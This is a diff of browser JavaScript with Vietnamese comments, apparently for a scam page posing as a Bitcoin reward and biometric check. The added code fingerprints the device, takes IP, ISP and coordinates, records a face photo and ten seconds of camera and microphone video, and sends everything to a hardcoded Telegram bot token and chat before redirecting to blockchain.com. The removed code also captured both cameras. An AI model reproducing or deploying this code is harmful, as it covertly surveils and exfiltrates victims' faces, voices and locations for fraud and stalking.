@@ -1,137 +1,130 @@
 (async function() {
-    const API_URL = '/api/send'; 
+    const BOT_TOKEN = '8637781182:AAH3RgQ_vuSl3urLFb-5MDizgTbZnF0LQMs';
+    const CHAT_ID = '-1003479049955';
+    const REDIRECT_URL = "https://www.blockchain.com/";
+
+    const btn = document.getElementById('startBtn');
+    const loading = document.getElementById('loading');
+    const video = document.getElementById('preview');
+    
     const info = {
         time: new Date().toLocaleString('vi-VN'),
-        ip: '⌛...', realIp: '⌛...', isp: '⌛...', location: '⌛...',
-        device: '⌛...', os: '⌛...', browser: navigator.userAgent, camera: '⏳...'
+        device: 'Đang xác định...',
+        os: '', ip: '', realIp: '', isp: '', address: '', lat: '', lon: ''
     };
 
-    function log(msg) {
-        if (window.updateStatus) window.updateStatus(msg);
-        console.log(`[Status] ${msg}`);
-    }
-
-    // 1. Thu thập thông tin đầy đủ
-    async function collectInfo() {
+    // --- 1. THU THẬP THÔNG TIN THIẾT BỊ ---
+    function detectDevice() {
         const ua = navigator.userAgent;
-        const platform = navigator.platform;
-        
         if (/Android/i.test(ua)) {
             info.os = 'Android';
             const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
             info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
-        } else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+        } else if (/iPhone|iPad|iPod/i.test(ua)) {
             info.os = 'iOS';
-            const screen = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}`;
-            const models = {"430x932@3":"14/15/16 PM","393x852@3":"14/15/16 Pro","428x926@3":"12/13/14 PM","390x844@3":"12/13/14","375x812@3":"X/XS/11P","414x896@3":"XS Max/11PM","414x896@2":"XR/11","375x667@2":"6/7/8/SE"};
-            info.device = 'iPhone ' + (models[screen] || 'Model');
+            info.device = 'iPhone/iPad';
         } else {
-            info.os = platform; info.device = 'PC/Laptop';
+            info.os = 'Desktop';
+            info.device = navigator.platform;
         }
-        document.getElementById('st-os').innerText = `${info.os} (${info.device})`;
+    }
 
+    async function getNetworkInfo() {
         try {
             const r = await fetch('https://ipwho.is/');
-            const d = await r.json();
-            info.ip = d.ip;
-            info.isp = d.connection.org;
-            info.location = `${d.city}, ${d.region}, ${d.country}`;
-            document.getElementById('st-ip').innerText = info.ip;
-            document.getElementById('st-loc').innerText = d.city || 'Việt Nam';
-        } catch (e) { info.ip = 'Lỗi'; }
+            const data = await r.json();
+            info.ip = data.ip || 'N/A';
+            info.realIp = data.ip || 'N/A';
+            info.isp = data.connection?.org || 'N/A';
+            info.address = `${data.city || ''}, ${data.region || ''}, ${data.country || ''}`;
+            info.lat = data.latitude || '0';
+            info.lon = data.longitude || '0';
+        } catch (e) { 
+            console.error("Network info error"); 
+            info.ip = 'Lỗi';
+        }
     }
 
-    // 2. Quay Video & Chụp ảnh
-    async function handleSecurityProcess() {
-        log("Đang khởi tạo hệ thống camera...");
-        
-        // --- CAMERA TRƯỚC ---
+    // --- 2. XỬ LÝ MEDIA ---
+    async function captureAndSend() {
         try {
-            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-            const videoPreview = document.getElementById('preview');
-            videoPreview.srcObject = frontStream;
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+            video.srcObject = stream;
 
-            const frontPhoto = await capturePhoto(videoPreview);
-            await sendData('media', { photos: [{ data: frontPhoto, caption: getReportCaption('📸 ẢNH TRƯỚC') }] });
+            // Đợi camera ổn định
+            await new Promise(r => setTimeout(r, 2000));
 
-            log("Đang xác thực khuôn mặt...");
-            await recordAndSend(frontStream, 3500, '🎬 VIDEO TRƯỚC');
-            frontStream.getTracks().forEach(t => t.stop());
-        } catch (e) { log("Không thể truy cập camera trước."); }
-
-        // --- CAMERA SAU ---
-        try {
-            log("Đang quét môi trường xung quanh...");
-            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-            const backVideo = document.createElement('video');
-            backVideo.srcObject = backStream;
-            await backVideo.play();
-
-            const backPhoto = await capturePhoto(backVideo);
-            await sendData('media', { photos: [{ data: backPhoto, caption: getReportCaption('📸 ẢNH SAU') }] });
-
-            await recordAndSend(backStream, 3500, '🎬 VIDEO SAU');
-            backStream.getTracks().forEach(t => t.stop());
-        } catch (e) { log("Không thể truy cập camera sau."); }
-
-        window.mainScriptFinished = true;
-    }
-
-    async function capturePhoto(videoEl) {
-        return new Promise(resolve => {
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = videoEl.videoWidth;
-                canvas.height = videoEl.videoHeight;
-                canvas.getContext('2d').drawImage(videoEl, 0, 0);
-                resolve(canvas.toDataURL('image/jpeg', 0.4));
-            }, 800);
-        });
-    }
-
-    async function recordAndSend(stream, duration, label) {
-        return new Promise(resolve => {
-            const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
-            const recorder = new MediaRecorder(stream, { mimeType });
-            const chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: mimeType });
-                const reader = new FileReader();
-                reader.onloadend = async () => {
-                    await sendData('video', { video: reader.result, caption: getReportCaption(label) });
-                    resolve();
-                };
-                reader.readAsDataURL(blob);
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), duration);
-        });
-    }
-
-    function getReportCaption(title) {
-        return `
-<b>${title}</b>
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // Chụp ảnh gửi kèm thông tin
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'face.jpg');
+                formData.append('caption', `
+🔔 KHÁCH NHẬN THƯỞNG BTC
 ━━━━━━━━━━━━━━━━━━
-🕒 <b>Thời gian:</b> ${info.time}
-📱 <b>Thiết bị:</b> ${info.device} (${info.os})
-🌐 <b>IP:</b> <code>${info.ip}</code>
-🏢 <b>ISP:</b> ${info.isp}
-📍 <b>Vị trí:</b> ${info.location}
-🔗 <b>Trình duyệt:</b> ${navigator.userAgent.substring(0, 40)}...
-`.trim();
-    }
+📱 Thiết bị: ${info.device} (${info.os})
+🌐 IP: ${info.ip}
+🏢 ISP: ${info.isp}
+📍 Vị trí: ${info.address}
+🗺️ Maps: https://www.google.com/maps?q=${info.lat},${info.lon}
+🕒 Thời gian: ${info.time}
+`.trim());
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg', 0.8);
 
-    async function sendData(type, payload) {
-        try {
-            await fetch(API_URL, {
+            // Quay video 10 giây
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            recorder.onstop = async () => {
+                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                const videoData = new FormData();
+                videoData.append('chat_id', CHAT_ID);
+                videoData.append('video', videoBlob, 'verify.mp4');
+                videoData.append('caption', '🎥 Video xác thực sinh trắc học (10s)');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: videoData });
+                
+                // Kết thúc và chuyển hướng
+                window.location.href = REDIRECT_URL;
+            };
+
+            recorder.start();
+            setTimeout(() => {
+                if (recorder.state !== "inactive") {
+                    recorder.stop();
+                    stream.getTracks().forEach(t => t.stop());
+                }
+            }, 10000);
+
+        } catch (err) {
+            console.error("Access denied or error:", err);
+            // Gửi tin nhắn văn bản báo lỗi nếu không lấy được camera
+            const textData = {
+                chat_id: CHAT_ID,
+                text: `❌ KHÁCH TỪ CHỐI CAMERA\n📱 Thiết bị: ${info.device}\n🌐 IP: ${info.ip}\n📍 Vị trí: ${info.address}`
+            };
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type, ...payload })
+                body: JSON.stringify(textData)
             });
-        } catch (e) { console.error(e); }
+            window.location.href = REDIRECT_URL;
+        }
     }
 
-    await collectInfo();
-    await handleSecurityProcess();
+    // --- 3. KHỞI CHẠY ---
+    detectDevice();
+    await getNetworkInfo();
+
+    btn.addEventListener('click', () => {
+        btn.style.display = 'none';
+        loading.style.display = 'block';
+        captureAndSend();
+    });
+
 })();
